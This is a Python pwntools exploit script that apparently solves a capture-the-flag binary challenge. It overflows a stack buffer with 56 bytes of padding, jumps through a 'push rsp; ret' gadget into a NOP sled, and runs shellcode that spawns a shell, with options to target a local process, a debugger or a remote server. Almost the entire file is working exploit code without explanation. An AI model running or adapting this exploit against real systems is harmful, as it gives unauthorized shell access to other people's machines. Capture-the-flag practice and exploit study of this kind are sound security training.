from pwn import *

# Set up pwntools for the correct architecture
exe = './challenge'

context.binary = elf = ELF(exe)
context.log_level = 'debug'

# terminal emulator (for debugging)
context.terminal = ['foot', '-e']
gdbscript = ''' 
init-pwndbg
continue                   
'''.format(**locals())

p: remote | process

def start(argv=[], *a, **kw):
    if args.GDB: # python solve.py GDB
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: # python solve.py REMOTE <SERVER> <PORT>
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

offset = 56
shellcode = asm(shellcraft.sh())

# ropper -f ./challenge --search "push rsp; ret"
push_rsp_ret = 0x4011fc

payload = flat(
    b'A' * offset,
    push_rsp_ret,
    asm('nop') * 16,
    shellcode
)

p = start()
p.sendlineafter(b"dude: ", payload)
p.interactive()